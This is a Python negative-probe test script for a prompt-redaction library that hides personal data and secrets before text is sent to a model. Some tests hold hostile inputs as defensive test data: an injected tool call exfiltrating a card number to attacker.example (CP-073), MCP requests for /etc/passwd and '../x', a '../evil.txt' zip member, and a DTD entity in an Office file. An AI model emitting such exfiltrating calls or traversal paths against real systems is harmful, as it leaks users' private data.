"""One direct negative probe per retired defect, plus scale and performance."""
import random, string, sys, time
import pathlib as _pathlib
# The repository root, from this file's own location: evidence/ -> _maintenance/
# -> cleanprompt/ -> maintenances/ -> root. Never a hard-coded checkout path,
# which silently probed a stale tree once the checkout moved (CP-053).
_ROOT = str(_pathlib.Path(__file__).resolve().parents[4])
sys.path.insert(0, _ROOT)
from scikitplot.cleanprompt import (DEFAULT_POLICY, PATTERNS, Redactor, default_registry, restore, get_pattern)
PATTERN_KINDS = set(PATTERNS)

fails = []
def check(cid, desc, ok, detail=""):
    print("%-9s %-4s %s%s" % (cid, "PASS" if ok else "FAIL", desc, ("  -> " + detail) if detail and not ok else ""))
    if not ok: fails.append(cid)

r = Redactor()
print("=" * 78); print("NEGATIVE PROBES — one per retired upstream defect"); print("=" * 78)

res = r.redact("Ann met Anna", extra_terms=["Ann", "Anna"])
check("CP-001", "shorter secret does not corrupt longer", res.text == "[CUSTOM-1] met [CUSTOM-2]", res.text)

res = r.redact("mail a@example.com about Acme", extra_terms=["Acme"])
check("CP-002", "extra terms do not disable structural detection", "a@example.com" not in res.text and "[CUSTOM-1]" in res.text, res.text)

a, b = r.redact("mail a@x.com"), r.redact("mail b@x.com")
check("CP-003", "no state carries between documents", a.text == b.text == "mail [EMAIL-1]", a.text + " / " + b.text)

# Upstream's URL class held an unescaped '-' between '$' and '_', a range that
# admits digits, capitals and '<'. The probe is on this package's pattern: text
# only that range would accept must not be found. (It used to restate the
# upstream class as well, which tested Python's ``re`` and nothing here.)
check("CP-004", "URL class is not an accidental range", get_pattern("URL").compiled().findall("see 5A< here") == [])

found = [m.group() for m in get_pattern("EMAIL").compiled().finditer("a@b.a|b")]
check("CP-005", "email domain admits no pipe", all("|" not in m for m in found), str(found))

once = r.redact("Contact [EMAIL-1] now")
check("CP-006", "placeholders survive re-detection", "[EMAIL-1]" in once.text and once.stats.entries == 0, once.text)

import pathlib, ast
pkg = pathlib.Path("scikitplot/cleanprompt")
bad = [p.name for p in pkg.rglob("*.py") if "tests" not in p.parts
       and any(x in p.read_text() for x in ("eval(", "exec(", "pickle.loads"))]
check("CP-007", "no eval/exec/pickle.loads in runtime code", bad == [], str(bad))

import inspect
from scikitplot.cleanprompt import LiteralDetector
sig = inspect.signature(Redactor.redact)
check("CP-008", "no mutable default arguments", not any(isinstance(p.default, (list, dict, set)) for p in sig.parameters.values()))

from scikitplot.cleanprompt import _app
src = pathlib.Path("scikitplot/cleanprompt/_app.py").read_text()
check("CP-009", "no module-level app/key/cleaner", "def create_app(" in src and "\napp = Flask" not in src and "CLEANPROMPT_SECRET_KEY" in src)

res = r.redact("mail ada@example.com")
back = restore(res.text, res.vault)
check("CP-012", "restoration returns plain text", "\033" not in back.text and back.text == "mail ada@example.com")

spec = get_pattern("PHONE")
fp = [t for t in ("2024-01-15", "12345678", "1.26.4") if [m for m in spec.compiled().finditer(t) if spec.validate(m)]]
check("CP-013", "phone rejects dates and order numbers", fp == [], str(fp))

check("CP-014", "CSRF token is required on every form", "_require_csrf" in src and src.count("_require_csrf(session") >= 2)

from scikitplot.cleanprompt import (CapabilityError, build_detectors, describe_engines,
                                    diagnose, encode, decode, session, Handle, _capabilities)
from scikitplot.cleanprompt._nltk import nltk_detector, corpora_status
from scikitplot.cleanprompt._diagnostics import _entity_remedy

print()
print("=" * 78); print("ROUND 3 — ENGINES, API, DIAGNOSIS"); print("=" * 78)

# CP-024: an explicit --ner that cannot be met must not report success.
_real_version = _capabilities._installed_version
_capabilities._installed_version = lambda _n: None
try:
    try:
        build_detectors(mode="auto", required=True)
        ok23 = False; why23 = "returned instead of raising"
    except CapabilityError as e:
        ok23 = "--ner-engine none" in str(e) and "spacy" in str(e) and "nltk" in str(e)
        why23 = str(e)[:80]
    ok23b = build_detectors(mode="auto") == [] and build_detectors(mode="none", required=True) == []
finally:
    _capabilities._installed_version = _real_version
check("CP-024", "unmeetable --ner raises, unrequired still degrades", ok23 and ok23b, why23)

# CP-025: an NLTK registry must not be reported as having no entity detection.
reg = default_registry(kinds=["EMAIL"]); reg.add(nltk_detector())
rep = diagnose(DEFAULT_POLICY, reg)
check("CP-025", "NLTK registry is not reported blind",
      rep.ner_active and not any("named entities" in s.category for s in rep.blind_spots))
check("CP-025b", "entity remedy names no retired model", "en_core_web_lg" not in _entity_remedy())

# CP-026: installed-but-unimportable is BROKEN, not a detector crash.
import builtins
from scikitplot.cleanprompt import _ner as _nermod, _nltk as _nltkmod
_real_import = builtins.__import__
_saved_pipes, _saved_toks = dict(_nermod._PIPELINES), dict(_nltkmod._RESOURCES)
_nermod._PIPELINES.clear(); _nltkmod._RESOURCES.clear()
_capabilities._installed_version = lambda _n: "3.9"
def _guard(name, *a, **k):
    if name.split(".")[0] in ("spacy", "nltk"):
        raise ImportError("blocked by probe: " + name)
    return _real_import(name, *a, **k)
builtins.__import__ = _guard
try:
    statuses = []
    for det in (nltk_detector(),):
        try:
            list(det.detect("Ada Lovelace", DEFAULT_POLICY)); statuses.append("NO RAISE")
        except CapabilityError as e:
            statuses.append(e.status)
        except Exception as e:
            statuses.append("WRONG:" + type(e).__name__)
finally:
    builtins.__import__ = _real_import
    _capabilities._installed_version = _real_version
    _nermod._PIPELINES.update(_saved_pipes); _nltkmod._RESOURCES.update(_saved_toks)
check("CP-026", "unimportable-but-installed tier reports BROKEN",
      statuses == ["BROKEN"], str(statuses))

# CP-044: a Markdown-escaped separator is one of the shapes a model returns.
# The documented table is read out of the docstring so the list cannot drift
# from the implementation without this probe noticing.
from scikitplot.cleanprompt._policy import TagStyle as _TagStyle
_style = _TagStyle()
_rows = [line.strip().split("  ")[0].strip()
         for line in (_style.lenient_pattern.__doc__ or "").splitlines()
         if line.strip().startswith(("[EMAIL", "[email", "\\[EMAIL"))]
_unmatched = [row for row in _rows
              if not _style.lenient_pattern().fullmatch(
                  row.replace("<U+2011>", "\u2011").replace("<NL>", "\n"))]
check("CP-044a", "every documented rewrite shape matches the pattern (%d rows)" % len(_rows),
      len(_rows) >= 8 and _unmatched == [], str(_unmatched))

_v44 = Redactor().redact("Mail ada@example.com and bob@example.com").vault
_esc = [r"[EMAIL\_1]", r"[email\_1]", r"\[EMAIL\_1\]", r"[EMAIL\-1]"]
_missed = [one for one in _esc
           if "ada@example.com" not in restore("I mailed %s." % one, _v44).text]
check("CP-044b", "an escaped separator restores", _missed == [], str(_missed))
_rewritten = [one for one in (r"See [see\_4].", r"See [note\_2].", r"See [fig\-3].")
              if restore(one, _v44).text != one]
check("CP-044c", "escaped prose lookalikes are untouched", _rewritten == [], str(_rewritten))

# CP-045: a reader closing the pipe is not an error this program reports.
import io as _io
from scikitplot.cleanprompt._cli import EXIT_BROKEN_PIPE as _EPIPE, main as _main

class _ClosedPipe(_io.StringIO):
    def write(self, _text):
        raise BrokenPipeError(32, "Broken pipe")

_pipe_status, _pipe_noise = [], []
for _frontend in ("argparse", "click"):
    _err = _io.StringIO()
    _pipe_status.append(_main(["--frontend", _frontend, "kinds"],
                              stdin=_io.StringIO(""), stdout=_ClosedPipe(), stderr=_err))
    _pipe_noise.append(_err.getvalue())
check("CP-045a", "a closed pipe exits %d in both frontends" % _EPIPE,
      _pipe_status == [_EPIPE, _EPIPE], str(_pipe_status))
check("CP-045b", "a closed pipe prints nothing to stderr",
      _pipe_noise == ["", ""], str(_pipe_noise))
_err = _io.StringIO()
_real = _main(["inspect", "--in", "/nonexistent/cleanprompt/input.txt"],
              stdin=_io.StringIO(""), stdout=_io.StringIO(), stderr=_err)
check("CP-045c", "an ordinary OSError is still reported",
      _real == 1 and "error:" in _err.getvalue(), "%s %r" % (_real, _err.getvalue()[:60]))

# --- round 12: packs, formats, the fluent plan -------------------------------
import json as _json, tempfile as _tempfile, zipfile as _zipfile
from scikitplot.cleanprompt import FluentCleanPrompt as _Fluent
from scikitplot.cleanprompt._custom import load_custom as _load_custom

_records = {
    "csv": ("name,phone,member_id\nMarion Holt,+1 555 010 4477,M-00412\n", ["Marion Holt", "M-00412"]),
    "json": ('{"patient": {"mrn": "00412345", "diagnosis": "E11.9", "insurer_id": "ZX-44"}}', ["00412345", "E11.9", "ZX-44"]),
    "shell": ('export DB_HOST=db.internal\nexport DB_PASSWORD=pw-1\nAPI_TOKEN="t-2"\n', ["db.internal", "pw-1", "t-2"]),
    "ini": ("db_password = pw-1\nowner = marion.holt\n", ["pw-1", "marion.holt"]),
}
_left = []
for _fmt, (_text, _secrets) in _records.items():
    _cl = _Fluent().materialize()
    _out = _cl.encode_text(_text, _fmt).text
    _left += ["%s:%s" % (_fmt, x) for x in _secrets if x in _out]
    if _cl.decode(_out) != _text:
        _left.append("%s:round-trip" % _fmt)
check("CP-048", "field values in record files are hidden and restore exactly", _left == [], str(_left))

with _tempfile.TemporaryDirectory() as _d:
    _f = _pathlib.Path(_d) / "t.json"
    _f.write_text(_json.dumps({"name": "tickets", "version": 1, "summary": "T.", "extensions": [".tkt"],
                               "splitter": "keyvalue", "round_trip": True, "packs": ["personal"]}))
    try:
        _ok49 = set(_load_custom(_f).formats) == {"tickets"}
    except Exception as _e:
        _ok49 = False
check("CP-049", "a custom format file with its own 'packs' key loads as a format", _ok49)

_cl = _Fluent().packs("none").hide("zzz").materialize()
_doc = '{"k2": "a\\\\zzz"}'
_enc = _cl.encode_text(_doc, "json").text
check("CP-050", "an escaped backslash before a placeholder survives decode", _cl.decode(_enc) == _doc, _enc)

_cl = _Fluent().packs("patient").materialize()
_a = _cl.encode_text("Seen today. MRN: 00412345.\n", "text").text
_b = _cl.encode_text('{"mrn": "00412345"}', "json").text
check("CP-051", "one value, one label across prose and record", "[MRN-1]" in _a and _b == '{"mrn": "[MRN-1]"}', "%r %r" % (_a, _b))

_cl = _Fluent().packs("secrets").profile("minimal").materialize()
_py = _cl.encode_text('password = "hunter2hunter2"\n', "python", name="m.py").text
check("CP-052", "pack and field detectors run under an explicit-kinds profile", "hunter2" not in _py, _py)

check("CP-053", "probes import the tree they live in", _pathlib.Path(__import__("scikitplot.cleanprompt").cleanprompt.__file__).resolve().is_relative_to(_pathlib.Path(_ROOT)), _ROOT)

with _tempfile.TemporaryDirectory() as _d:
    _src = _pathlib.Path(_d) / "in.zip"
    with _zipfile.ZipFile(_src, "w") as _z:
        _z.writestr("a.csv", "email\nann@example.com\n")
        _z.writestr("../evil.txt", "x")
    _items = {i.relative: i.status for i in _Fluent().materialize().encode_archive(_src, _pathlib.Path(_d) / "out.zip")}
    with _zipfile.ZipFile(_pathlib.Path(_d) / "out.zip") as _z:
        _names = _z.namelist()
check("R12-ZIP", "an unsafe member is refused and never written", _items.get("../evil.txt") == "refused" and _names == ["a.csv"], "%s %s" % (_items, _names))

# --- round 13: the gate, logging -------------------------------------------
import io as _io13, json as _json13, random as _random13
from scikitplot.cleanprompt import configure_logging as _cfg13, get_logger as _gl13, LeakError as _Leak13
from scikitplot.cleanprompt._logging import redacting as _redacting13

_buf = _io13.StringIO(); _cfg13("debug", "json", stream=_buf)
with _redacting13(["topsecret@example.com"]):
    _gl13("scikitplot.cleanprompt._api").warning("x %s", "topsecret@example.com", extra={"w": "topsecret@example.com"})
_g = _Fluent().guard(); _g.outgoing("mail ann@example.com")
_gl13("scikitplot.cleanprompt._engine").warning("careless ann@example.com")
_g.clear()
check("CP-059", "child-logger records, extras and held values are scrubbed", "topsecret" not in _buf.getvalue() and "ann@example.com" not in _buf.getvalue(), _buf.getvalue()[:160])
_cfg13("warning", stream=_io13.StringIO())

_g = _Fluent().packs("all").style("surrogate").guard()
_g.outgoing("name,email\nMarion Holt,ann@example.com\nMarion,bob@example.org\n", "csv")
_reply = "Re: " + _g.outgoing("Call Marion Holt, Marion and ann@example.com") + " [EMAIL-1]"
_whole = _g.incoming(_reply); _rng = _random13.Random(3); _bad = 0
for _ in range(500):
    _d = _g.stream(); _out = []; _i = 0
    while _i < len(_reply):
        _n = _rng.randint(1, 7); _out.append(_d.feed(_reply[_i:_i+_n])); _i += _n
    _out.append(_d.flush()); _bad += "".join(_out) != _whole
check("CP-060", "500 random chunkings of a surrogate reply decode like the whole", _bad == 0, "%d differ" % _bad)

import subprocess as _sp13, time as _time13
_t0 = _time13.monotonic()
_p = _sp13.run("%s -m scikitplot.cleanprompt ask --via \"%s -c 'import sys\nwhile True: sys.stdout.write(chr(120)*999); sys.stdout.flush()'\" hi | head -c 5" % (sys.executable, sys.executable), shell=True, capture_output=True, text=True, cwd=_ROOT, timeout=60)
check("CP-061", "ask behind a closed pipe exits promptly", _time13.monotonic() - _t0 < 30 and _p.stdout == "xxxxx", repr(_p.stdout[:20]))

_c = _Fluent().packs("patient").materialize()
_t = _c.encode_text("Follow up on MRN: 00412345, patient mail ann@example.com.", "text").text
check("CP-062", "a prose MRN does not swallow the rest of the line", _t == "Follow up on MRN: [MRN-1], patient mail [EMAIL-1].", _t)

_g = _Fluent().packs("personal").remember(False).guard(); _g.outgoing("name: Marion Holt"); _called = []
try:
    _g.ask("Marion Holt called", lambda s: _called.append(s) or s); _blocked = False
except _Leak13:
    _blocked = True
check("R13-GATE", "a recurrence with remember off is refused before the model is called", _blocked and _called == [])

# --- round 14: MCP, learning, plans ----------------------------------------
import json as _json14, tempfile as _tmp14
from scikitplot.cleanprompt import Guard as _Guard14
from scikitplot.cleanprompt._mcp import McpServer as _Mcp14
from scikitplot.cleanprompt._runtime import Cleaner as _Cleaner14
from scikitplot.cleanprompt._plan import save_plan as _save14, load_plan as _load14

with _tmp14.TemporaryDirectory() as _d:
    _r = _pathlib.Path(_d); (_r / "src").mkdir()
    (_r / "src" / "a_note.txt").write_text("Call Marion Holt today.\n")
    (_r / "src" / "b_people.csv").write_text("name\nMarion Holt\n")
    list(_Fluent().materialize().encode_tree(_r / "src", _r / "out"))
    _note = (_r / "out" / "a_note.txt").read_text()
check("CP-063", "a name is hidden in a note sorted before the record naming it", "Marion" not in _note, _note)

with _tmp14.TemporaryDirectory() as _d:
    _r = _pathlib.Path(_d)
    (_r / "p.csv").write_text("name,email,mrn\nMarion Holt,ann@example.com,00412345\n")
    _plan14 = _Fluent().packs("all").plan()
    _srv = _Mcp14(lambda: _Guard14(_Cleaner14(_plan14)), [_r])
    _calls = [("cleanprompt_read_file", {"path": "p.csv"}), ("cleanprompt_inspect", {"path": "p.csv"}),
              ("cleanprompt_write_file", {"path": "o.txt", "text": "[PERSON-1] [EMAIL-1]"}),
              ("cleanprompt_read_file", {"path": "/etc/passwd"}), ("cleanprompt_encode_folder", {"source": ".", "target": "../x"})]
    _out = _json14.dumps([_srv.handle({"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": n, "arguments": a}}) for i, (n, a) in enumerate(_calls)])
    _ok = not any(x in _out for x in ("Marion", "ann@example.com", "00412345", str(_r)))
    _written = (_r / "o.txt").read_text()
check("R14-MCP", "no MCP tool result carries a value or the root path; writes restore on disk", _ok and _written == "Marion Holt ann@example.com", _out[:160])

with _tmp14.TemporaryDirectory() as _d:
    _f = _pathlib.Path(_d) / "team.json"
    _save14(_Fluent().packs("patient").plan(), _f)
    _doc = _json14.loads(_f.read_text()); _doc["fingerprint"] = "0" * 64; _f.write_text(_json14.dumps(_doc))
    try:
        _load14(_f); _stale = False
    except Exception:
        _stale = True
check("R14-PLAN", "a plan whose definitions changed is refused", _stale)

# Engine interchangeability: the canonical vocabulary is the whole point.
_engines_live = [n for n in ("spacy", "nltk")
                 if describe_engines()["engines"][n]["usable"]]
if _engines_live:
    from scikitplot.cleanprompt._engines import CANONICAL_LABELS
    sample = "Ada Lovelace wrote to ada@example.com from London on 2024-01-15."
    kinds_by_engine, rt_ok = {}, True
    for name in _engines_live:
        reg = default_registry(); reg.add(build_detectors(mode=name)[0])
        res = Redactor(registry=reg).redact(sample)
        kinds_by_engine[name] = {e.kind for e in res.entries}
        if restore(res.text, res.vault).text != sample: rt_ok = False
    uncanonical = {k for ks in kinds_by_engine.values() for k in ks
                   if k not in CANONICAL_LABELS and k not in PATTERN_KINDS}
    check("ENG-001", "every live engine round-trips exactly (%s)" % ",".join(_engines_live), rt_ok)
    check("ENG-002", "no engine emits an uncanonical label", uncanonical == set(), str(uncanonical))
else:
    print("ENG-001   SKIP no entity engine usable in this environment")

# --- round 15: large record files, shared log scrubbing, dry runs -----------
import io as _io15, logging as _logging15, time as _time15
from scikitplot.cleanprompt._engine import Redactor as _Red15
from scikitplot.cleanprompt._detectors import default_registry as _reg15
from scikitplot.cleanprompt._policy import DEFAULT_POLICY as _P15, Limits as _L15
from scikitplot.cleanprompt._logging import VaultScrubber as _VS15, get_logger as _gl15
from scikitplot.cleanprompt import configure_logging as _cfg15

_pol = _P15.evolve(kinds=("EMAIL",), limits=_L15(max_entries=2))
_red = _Red15(policy=_pol, registry=_reg15(kinds=("EMAIL",)))
_seed = _red.redact("a@x.com b@x.com").entries
try:
    _t = _red.redact("c@x.com d@x.com", seed=_seed).text; _ok = True
except Exception as _e:
    _t, _ok = repr(_e), False
check("CP-064", "a seed of earlier entries does not use up max_entries", _ok and _t == "[EMAIL-3] [EMAIL-4]", _t)

_buf = _io15.StringIO(); _cfg15("info", "json", stream=_buf)
_holders = [_VS15() for _ in range(3000)]
for _i, _h in enumerate(_holders):
    _h.add(["user%d@example.com" % _i])
_t0 = _time15.monotonic()
for _i in range(500):
    _gl15("scikitplot.cleanprompt._probe").warning("user%d@example.com", _i)
_dt = _time15.monotonic() - _t0
for _h in _holders:
    _h.close()
_cfg15("warning", stream=_io15.StringIO())
check("CP-065", "500 records against 3000 live holders: scrubbed, in under 5 s",
      "@example.com" not in _buf.getvalue() and _dt < 5.0, "%.2fs" % _dt)

_rows = "name,email\n" + "".join("P%d Q,p%d@example.com\n" % (_i, _i) for _i in range(400))
_one = _Cleaner14(_Fluent().plan()).encode_text(_rows, "csv").text
_many = _Cleaner14(_Fluent().plan(), chunk_chars=97).encode_text(_rows, "csv")
check("R15-CHUNK", "a CSV encoded in 97-char pieces equals one pass",
      _many.text == _one and _many.report.get("chunks", 0) > 50, str(_many.report.get("chunks")))

with _tmp14.TemporaryDirectory() as _d:
    _r = _pathlib.Path(_d); (_r / "src").mkdir()
    (_r / "src" / "a.csv").write_text("name,email\nMarion Holt,ann@example.com\n")
    _c = _Fluent().materialize(); _before = sorted(_r.rglob("*"))
    _items = _c.survey_tree(_r / "src")
    _after = sorted(_r.rglob("*"))
check("R15-SURVEY", "a dry run writes nothing, remembers nothing, and names kinds only",
      _before == _after and _c.decode("[PERSON-1]") == "[PERSON-1]"
      and _items[0].kinds == {"EMAIL": 1, "PERSON": 1} and "Marion" not in repr(_items), repr(_items))

# --- round 16: shared owners across threads; async clients -----------------
import sys as _sys16, threading as _th16, asyncio as _aio16
from scikitplot.cleanprompt import session as _session16


def _hammer16(encode, decode):
    out, errs = {}, []

    def work(w):
        try:
            for t in range(30):
                x = "mail u%d_%d@example.com and s%d@example.com" % (w, t, t % 5)
                out[(w, t)] = (x, encode(x))
        except Exception as e:  # noqa: BLE001
            errs.append(repr(e))

    old = _sys16.getswitchinterval(); _sys16.setswitchinterval(1e-6)
    try:
        ts = [_th16.Thread(target=work, args=(w,)) for w in range(8)]
        [t.start() for t in ts]; [t.join() for t in ts]
    finally:
        _sys16.setswitchinterval(old)
    owner, bad = {}, len(errs)
    for x, y in out.values():
        bad += decode(y) != x
        for v, l in zip(x.replace(" and ", " ").split()[1:], y.replace(" and ", " ").split()[1:]):
            bad += owner.setdefault(l, v) != v
    return bad


_c16 = _Fluent().materialize(); _g16 = _Fluent().guard()
with _session16() as _s16:
    _bad = (_hammer16(lambda t: _c16.encode_text(t).text, _c16.decode)
            + _hammer16(_g16.outgoing, _g16.incoming) + _hammer16(_s16.encode, _s16.decode))
check("CP-067", "8 threads sharing a Cleaner, a Guard and a Session: one label per value", _bad == 0, "%d problems" % _bad)


async def _model16(p):
    await _aio16.sleep(0)
    return "to " + p.split()[-1]


_ga = _Fluent().guard()
_ans = _aio16.run(_ga.aask("mail ann@example.com", _model16))
check("R16-ASYNC", "aask encodes, awaits and decodes", _ans == "to ann@example.com", _ans)

# --- round 17: one vault file, many processes ------------------------------
import concurrent.futures as _cf17, json as _json17, os as _os17, subprocess as _sp17, threading as _th17
from scikitplot.cleanprompt._files import atomic_write as _aw17

_REPO17 = str(_pathlib.Path(__file__).resolve().parents[4])
with _tmp14.TemporaryDirectory() as _d:
    _v = _os17.path.join(_d, "vault.json")

    def _enc17(i):
        r = _sp17.run([_sys16.executable, "-m", "scikitplot.cleanprompt", "encode", "-q",
                       "mail user%d@example.com" % i, "--vault", _v],
                      capture_output=True, text=True, cwd=_REPO17, timeout=120)
        return i, r.returncode, r.stdout.strip()

    with _cf17.ThreadPoolExecutor(8) as _ex:
        _runs = list(_ex.map(_enc17, range(8)))
    _bad = sum(1 for _, rc, _ in _runs if rc)
    for _i, _rc, _safe in _runs:
        if not _rc:
            _back = _sp17.run([_sys16.executable, "-m", "scikitplot.cleanprompt", "decode", _safe, "--vault", _v],
                              capture_output=True, text=True, cwd=_REPO17).stdout.strip()
            _bad += _back != "mail user%d@example.com" % _i
    _labels = {s.split()[-1] for _, rc, s in _runs if not rc}
check("CP-068", "8 processes encoding into one vault: 8 labels, every reply decodes", _bad == 0 and len(_labels) == 8, "%d bad, %d labels" % (_bad, len(_labels)))

with _tmp14.TemporaryDirectory() as _d:
    _v = _os17.path.join(_d, "vault.json")
    _aw17(_v, _json17.dumps({"entries": "x" * 200000}))
    _stop, _broken = _th17.Event(), []

    def _read17():
        while not _stop.is_set():
            try:
                _json17.loads(open(_v, encoding="utf-8").read())
            except ValueError:
                _broken.append(1)

    _t = _th17.Thread(target=_read17); _t.start()
    for _n in range(60):
        _aw17(_v, _json17.dumps({"entries": "y" * (100000 + 1000 * _n)}))
    _stop.set(); _t.join()
check("CP-069", "a reader during 60 vault rewrites never sees a partial file", not _broken, "%d partial reads" % len(_broken))

# --- round 18: the same value, however it is written -----------------------
_g18 = _Fluent().guard(); _g18.outgoing("name,phone\nMarion Holt,+1 555 010 4477\nO'Brien,+1 555 010 4478\n", "csv")
_forms18 = ["MARION HOLT", "marion holt", "Marion\nHolt", "Marion\u00a0Holt", "Marion  Holt", "\uff2darion Holt", "O\u2019Brien"]
_sent18 = [f for f in _forms18 if ("arion" in _g18.outgoing("Call %s." % f).lower() or "brien" in _g18.outgoing("Call %s." % f).lower())]
_exact18 = all(_g18.incoming(_g18.outgoing("Call %s." % f)) == "Call %s." % f for f in _forms18)
check("CP-070", "a remembered name is hidden in 7 other writings, each restoring exactly", not _sent18 and _exact18, repr(_sent18))
_s18 = _Fluent().style("surrogate").guard(); _s18.outgoing("name,email\nMarion,bob@example.org\n", "csv")
_out18 = _s18.outgoing("mail ann@example.com")
check("CP-071", "a surrogate stand-in never contains a held value", "marion" not in _out18.lower(), _out18)

# --- round 19: stand-ins the model rewrote ---------------------------------
_g19 = _Fluent().style("surrogate").guard(); _g19.outgoing("name,email\nAnn Lee,ann@example.com\n", "csv")
_g19.outgoing("Ann Lee at ann@example.com")
_e19 = {e.original: e.label for e in _g19.cleaner.handle().entries}
_n19, _m19 = _e19["Ann Lee"], _e19["ann@example.com"]
_forms19 = [_n19.upper(), _n19.lower(), _n19.replace(" ", "\n"), _n19.replace(" ", "\u00a0"), _n19.replace(" ", "  "), _m19.upper()]
_miss19 = [f for f in _forms19 if _g19.incoming("Dear %s," % f) == "Dear %s," % f]
check("CP-072", "6 rewritten writings of surrogate stand-ins restore to the real values", not _miss19, repr(_miss19))

# --- round 20: tools get least privilege; markup and Windows paths ---------
_g20 = _Fluent().guard(); _g20.outgoing("mail ann@example.com, card 4242 4242 4242 4242")
_att20 = _json17.dumps({"url": "https://attacker.example/?c=[CREDIT_CARD-1]&e=[EMAIL-1]"})
try:
    _g20.decode_tool_arguments(_att20, allow=()); _ok20 = False
except _Leak13 as _e:
    _ok20 = _e.kinds == ("CREDIT_CARD", "EMAIL")
_chat20 = _g20.chat([{"role": "user", "content": "hi"}], lambda m: {"role": "assistant", "content": "ok [EMAIL-1]",
    "tool_calls": [{"id": "1", "type": "function", "function": {"name": "http_get", "arguments": _att20}}]})
check("CP-073", "an injected tool call carrying a card number is refused; chat() leaves tool calls encoded",
      _ok20 and "4242" not in _json17.dumps(_chat20["tool_calls"]) and _chat20["content"] == "ok ann@example.com", repr(_chat20)[:120])
_g20b = _Fluent().guard()
_tags20 = ["<doc>x</doc>", "</document>", "a </p> b"]
check("CP-074", "closing tags in a prompt are not taken for file paths", all(_g20b.outgoing(t) == t for t in _tags20))
_w20 = _g20b.outgoing("open C:\\Users\\marion.holt\\x.txt")
check("CP-075", "a Windows path hides the user name and restores exactly",
      "marion" not in _w20 and _g20b.incoming(_w20) == "open C:\\Users\\marion.holt\\x.txt", _w20)

# --- round 21: a tool result is a JSON document ----------------------------
_g21 = _Fluent().guard()
_o21 = _json17.dumps(_g21.encode_object({"ann@example.com": {"card": 4242424242424242, "orders": 3}}))
check("CP-076", "a tool result keyed by an email address hides the key", "ann@example.com" not in _o21, _o21)
check("CP-077", "a card number stored as a JSON integer is hidden", "4242424242424242" not in _o21, _o21)
_c21 = _Fluent().materialize()
_t21 = _json17.dumps({"note": "line one\npassword: hunter2hunter2\nnext: ok"})
_s21 = _c21.encode_text(_t21, "json").text
check("CP-078", "Key: value prose inside a JSON string is read, and the file stays JSON",
      "hunter2hunter2" not in _s21 and _json17.loads(_c21.decode(_s21)) == _json17.loads(_t21), _s21)

# --- round 22: what is committed is read by scanners -----------------------
from scikitplot.cleanprompt._catalog import (AT_REST_PACKS as _ARP, CONFIG_DIR as _CFG,
    at_rest_findings as _arf, builtin_catalog as _bc22)
_cp22 = [_bc22().packs[n] for n in _ARP]
_pkg22 = _pathlib.Path(_ROOT, "scikitplot", "cleanprompt")
_tx22 = {}
for _p22 in sorted(_pkg22.rglob("*")):
    if _p22.is_file() and "__pycache__" not in _p22.parts:
        try: _tx22[_p22.relative_to(_pkg22).as_posix()] = _p22.read_text(encoding="utf-8")
        except UnicodeDecodeError: pass
_f22 = _arf(_tx22, _cp22)
_whole22 = [e for pk in _cp22 for s in pk.patterns for e in s.examples_yes]
_seen22 = _arf({"x": "\n".join(_whole22)}, _cp22)
check("CP-079", "no file in the package holds a whole credential-shaped value, and the check is armed",
      _f22 == [] and len(_tx22) > 50 and len(_seen22) >= len(_whole22)
      and not any(w in line for w in _whole22 for line in _seen22), str(_f22[:3]))
from scikitplot.cleanprompt._office import extract_office_text as _eot22
from scikitplot.cleanprompt import CleanPromptError as _CPE22
import io as _io22, zipfile as _zf22
def _dtd22(enc):
    body = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e "boom">]>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>').encode(enc)
    buf = _io22.BytesIO()
    with _zf22.ZipFile(buf, "w") as z: z.writestr("word/document.xml", body)
    try: _eot22(buf.getvalue(), "docx")
    except _CPE22 as exc: return "DTD" in str(exc)
    return False
check("CP-080", "a DTD in a UTF-16 Office part is refused, in every byte order",
      all(_dtd22(e) for e in ("utf-16", "utf-16-le", "utf-16-be")))
import subprocess as _sp22
# The parent package is replaced by an empty stand-in so the measurement covers
# this submodule alone (CP-085); ``scikitplot/__init__.py`` imports NumPy.
_iso22 = ("import sys, types; _p = types.ModuleType('scikitplot'); _p.__path__ = [%r]; "
          "sys.modules['scikitplot'] = _p; " % (str(_pkg22.parent),))
_code22 = (_iso22 + "before = set(sys.modules); import scikitplot.cleanprompt, scikitplot.cleanprompt._runtime, "
           "scikitplot.cleanprompt._guard, scikitplot.cleanprompt._office; "
           "print(sorted(m for m in {m.split('.')[0] for m in set(sys.modules) - before} "
           "if m not in sys.stdlib_module_names and m != 'scikitplot' and not m.startswith('_')))")
if sys.version_info >= (3, 10):
    _out22 = _sp22.run([sys.executable, "-c", _code22], capture_output=True, text=True, cwd=_ROOT)
    check("CP-081", "importing the runtime, the gate and the Office reader loads the standard library only",
          _out22.returncode == 0 and _out22.stdout.strip() == "[]", _out22.stdout + _out22.stderr[-300:])
else:
    print("CP-081    SKIP sys.stdlib_module_names needs Python 3.10")
from scikitplot.cleanprompt import Session as _Session22
with _Session22() as _s22:
    _e22 = _s22.encode("mail ada@example.com")
    check("CP-082", "a session turn encodes, and decodes back", "ada@example.com" not in _e22
          and _s22.decode(_e22) == "mail ada@example.com", _e22)
import ast as _ast22
_imp22 = [n for n in _ast22.walk(_ast22.parse((_pkg22 / "_corpus.py").read_text(encoding="utf-8")))
          if isinstance(n, (_ast22.Import, _ast22.ImportFrom))]
_sib22 = [(a.name if isinstance(n, _ast22.Import) else n.module) for n in _imp22
          for a in (n.names if isinstance(n, _ast22.Import) else [None])
          if (isinstance(n, _ast22.Import) and a.name.split(".")[0] == "scikitplot")
          or (isinstance(n, _ast22.ImportFrom) and n.level == 0 and (n.module or "").split(".")[0] == "scikitplot")]
check("CP-083", "the corpus bridge names scikitplot.corpus, and nothing else, in its sibling import",
      _sib22 != [] and all(m == "scikitplot.corpus" or m.startswith("scikitplot.corpus.") for m in _sib22), str(_sib22))
from scikitplot.cleanprompt._packs import PackError as _PE22, pack_from_document as _pfd22
def _refused22(doc):
    try: _pfd22(doc)
    except _PE22 as exc: return str(exc)
    return ""
_base22 = {"name": "hr", "version": 1, "summary": "x",
           "patterns": [{"kind": "EMPLOYEE", "pattern": r"\bEMP-\d{6}\b", "intent": "An employee number.",
                         "examples_yes": [["EMP-", "004121"]], "examples_no": ["EMP-12"]}]}
check("CP-084", "a declared-but-empty section is refused; a fragmented example is joined and tested",
      "fields: is declared but empty" in _refused22(dict(_base22, fields=[]))
      and _pfd22(_base22).patterns[0].examples_yes == ("EMP-004121",))
